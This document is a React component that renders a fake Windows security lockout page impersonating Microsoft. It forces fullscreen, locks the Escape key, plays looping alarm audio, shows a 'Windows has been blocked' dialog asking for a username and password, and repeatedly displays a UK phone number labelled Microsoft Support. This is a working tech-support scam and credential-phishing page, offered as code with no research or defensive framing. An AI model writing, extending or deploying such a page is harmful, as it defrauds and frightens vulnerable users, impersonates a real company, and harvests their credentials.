import { useState, useEffect } from 'react';
import '../../assets/css/microsoft.css';
import { FaBell, FaCog, FaQuestionCircle } from 'react-icons/fa';
import SecondContainer from "../../assets/components/second-container";
import ThirdContainer from "../../assets/components/third-container";

function Microsoft() {
    const [showLogin, setShowLogin] = useState(true);
    const [escHoldStart, setEscHoldStart] = useState<number | null>(null);
    const HOLD_DURATION = 3000;

    const requestKeyboardLock = async () => {
        if ('keyboard' in navigator) {
            try {
                await (navigator as any).keyboard.lock(['Escape']);
            } catch (err) { }
        }
    };

    const unlockKeyboard = () => {
        if ('keyboard' in navigator) {
            (navigator as any).keyboard.unlock();
        }
    };

    useEffect(() => {
        let isMounted = true;

        const enterFullScreen = async () => {
            const elem = document.documentElement;
            try {
                await elem.requestFullscreen();
                if (isMounted) await requestKeyboardLock();
            } catch (err) {
                Object.assign(document.documentElement.style, {
                    position: 'fixed',
                    inset: '0',
                    width: '100vw',
                    height: '100vh',
                    overflow: 'hidden',
                    zIndex: '9999',
                });
            }
        };

        enterFullScreen();

        const handleFullscreenChange = () => {
            if (!document.fullscreenElement) {
                unlockKeyboard();
            } else if (isMounted) {
                requestKeyboardLock();
            }
        };

        document.addEventListener('fullscreenchange', handleFullscreenChange);

        return () => {
            isMounted = false;
            unlockKeyboard();
            document.removeEventListener('fullscreenchange', handleFullscreenChange);
            if (document.fullscreenElement) {
                document.exitFullscreen().catch(() => { });
            }
        };
    }, []);

    useEffect(() => {
        const handleKeyDown = (e: KeyboardEvent) => {
            if (e.key === 'Escape') {
                e.preventDefault();
                if (escHoldStart === null) {
                    setEscHoldStart(Date.now());
                }
            }
        };

        const handleKeyUp = (e: KeyboardEvent) => {
            if (e.key === 'Escape' && escHoldStart !== null) {
                const held = Date.now() - escHoldStart;
                if (held >= HOLD_DURATION) {
                    setShowLogin(false);
                }
                setEscHoldStart(null);
            }
        };

        window.addEventListener('keydown', handleKeyDown, { capture: true });
        window.addEventListener('keyup', handleKeyUp, { capture: true });

        return () => {
            window.removeEventListener('keydown', handleKeyDown, { capture: true });
            window.removeEventListener('keyup', handleKeyUp, { capture: true });
        };
    }, [escHoldStart]);

    useEffect(() => {
        const secondAudio = new Audio("/microsoft/censor-beep-2.mp3");
        const playAudio = () => {
            secondAudio.currentTime = 0;
            secondAudio.play().catch(() => { });
        };

        const interval = setInterval(playAudio, 5000);

        return () => {
            clearInterval(interval);
            secondAudio.pause();
        };
    }, []);

    return (
        <div className="fake-desktop">
            <audio src="/microsoft/generated-audio.mp3" autoPlay loop />

            <div className="left-container">
                <div className="top-right-toolbar">
                    <div className="window-buttons">
                        <button className="window-btn">−</button>
                        <button className="window-btn">□</button>
                        <button className="window-btn close-btn">×</button>
                    </div>

                    <div className="extra-buttons">
                        <button className="redeem-button">Redeem license code</button>

                        <button className="extra-btn">
                            <FaBell />
                        </button>
                        <button className="extra-btn">
                            <FaCog />
                        </button>
                        <button className="extra-btn">
                            <FaQuestionCircle />
                        </button>
                    </div>
                </div>

                <div className="sidebar-content">
                    <p>Left sidebar content</p>
                </div>
            </div>

            <SecondContainer />
            <ThirdContainer />

            <footer className="page-footer">
                <div className="footer-top">
                    <img src="/microsoft/logo.webp" alt="Windows Logo" className="footer-logo" />
                    <span>Windows Security</span>
                    <span>Microsoft Support</span>
                    <span className="footer-phone">020 4549 4912</span>
                </div>

                <div style={{
                    position: 'absolute',
                    right: '20px',
                    bottom: '50%',
                    transform: 'translateY(-50%)',
                    animation: 'jump 1.2s infinite ease-in-out',
                    marginBottom: '70px'
                }}>
                    <div style={{
                        position: 'relative',
                        background: '#fff',
                        border: '3px solid #ffcc00',
                        borderRadius: '12px',
                        padding: '12px 20px',
                        boxShadow: '0 4px 15px rgba(0,0,0,0.4)',
                        fontWeight: 'bold',
                        color: '#000',
                        fontSize: '18px',
                        whiteSpace: 'nowrap',
                        textAlign: 'center'
                    }}>
                        <div style={{ color: '#0067c5', fontSize: '22px', marginBottom: '4px' }}>
                            <img src="/microsoft/logo.webp" alt="Windows Logo" className="footer-logo" />
                            &nbsp;Microsoft
                        </div>
                        <div style={{ color: '#0067c5' }}>
                            Microsoft Support
                        </div>
                        <div style={{
                            color: '#d32f2f',
                            fontSize: '24px',
                            fontWeight: 'bold',
                            marginTop: '8px'
                        }}>
                            020 4549 4912
                        </div>

                        <div style={{
                            position: 'absolute',
                            bottom: '-20px',
                            left: '50%',
                            transform: 'translateX(-50%)',
                            width: '0',
                            height: '0',
                            borderLeft: '20px solid transparent',
                            borderRight: '20px solid transparent',
                            borderTop: '20px solid #ffcc00',
                            zIndex: '1'
                        }} />

                        <div style={{
                            position: 'absolute',
                            bottom: '-16px',
                            left: '50%',
                            transform: 'translateX(-50%)',
                            width: '0',
                            height: '0',
                            borderLeft: '18px solid transparent',
                            borderRight: '18px solid transparent',
                            borderTop: '18px solid #fff',
                            zIndex: '2'
                        }} />
                    </div>
                </div>

                <div className="footer-marquee">
                    <div className="marquee-content">
                        <span>
                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you.  &nbsp;
                        </span>
                        <span>
                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you.  &nbsp;
                        </span>
                    </div>
                </div>
            </footer>

            {showLogin && (
                <div className="login-overlay" onClick={() => setShowLogin(false)}>
                    <div className="login-dialog" onClick={e => e.stopPropagation()}>
                        <div className="dialog-title-bar">
                            <button className="close" onClick={() => setShowLogin(false)}>×</button>
                        </div>
                        <div className="dialog-body">
                            <span style={{ fontSize: "28px", fontFamily: "Segoe UI" }}>Administrator login</span>
                            <p style={{ marginTop: "20px" }}>
                                Windows has been blocked due to suspicious activity.
                                Try logging in again with your Windows account and password.
                                If you need help, contact Windows Support.
                            </p>
                            <div className="phone-large">020 4549 4912</div>
                            <div className="form">
                                <input type="text" placeholder="Username" />
                                <input type="password" placeholder="Password" />
                                <button className="login-button">Login</button>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

export default Microsoft;